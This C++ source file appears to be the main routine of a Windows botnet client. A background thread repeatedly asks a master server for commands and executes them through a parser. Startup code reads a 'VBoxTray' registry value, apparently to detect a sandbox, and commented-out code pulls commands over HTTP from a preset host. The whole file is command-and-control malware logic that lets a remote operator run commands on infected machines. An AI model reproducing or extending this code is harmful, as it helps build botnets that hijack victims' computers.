#include <iostream>
#include "http_client.h"
#include "http_request.h"
#include "parser.h"
#include "utils.h"
#include "define.h"
#include "master_conn.h"

#include <Windows.h>

DWORD WINAPI ThreadFunction(LPVOID lpParam) {
    typedef botnet::http::http_request http_request;
    typedef botnet::http::http_client http_client;
    typedef botnet::parser parser;
    typedef botnet::master_conn master_conn;
    parser *pcmd;
    master_conn *conn = new master_conn();

    for (;;) {
        
        std::cout << "ask for command" << '\n';
        std::vector<std::string> arr = conn->ask_for_cmd();
        for (int i = 0; i < arr.size(); i++) {
            std::cout << ">>>" << arr[i] << '\n';
        }

        pcmd = new parser(arr);
        pcmd->execute();
        delete pcmd;

        Sleep(3000);
    }
}

int main() {
    HANDLE  hThreadArray;
    DWORD   dwThread;

    std::wcout << botnet::ReadRegValue(HKEY_LOCAL_MACHINE, "", "VBoxTray") << '\n';

    hThreadArray = CreateThread(NULL, 0, ThreadFunction, NULL, 0, &dwThread);
    std::cout << "Win Lixo" << '\n';

    WaitForSingleObject(hThreadArray, INFINITE);

   /* std::string cmds;
    parser *pcmd;

    std::cout << "Program name: " << botnet::my_name() << '\n';

    http_request *http_req = new http_request(botnet::http::GET);
    http_request::headers header;
    std::string host = HOST + ':' + std::to_string(PORT);
    header.add("Host", host);
    http_req->setHeaders(header);

    http_client *http_c = new http_client(HOST, PORT);
    http_c->request(http_req);

	std::cout << http_c->getContent() << '\n';
    cmds = http_c->getContent();
    std::size_t found = cmds.find("\r\n\r\n");
    std::cout << "pos: " << found << '\n';
    cmds = cmds.substr(found +4);
    std::cout << "comandos:\n" << cmds;
    pcmd = new parser(cmds);
    pcmd->execute();*/

	return 0;
}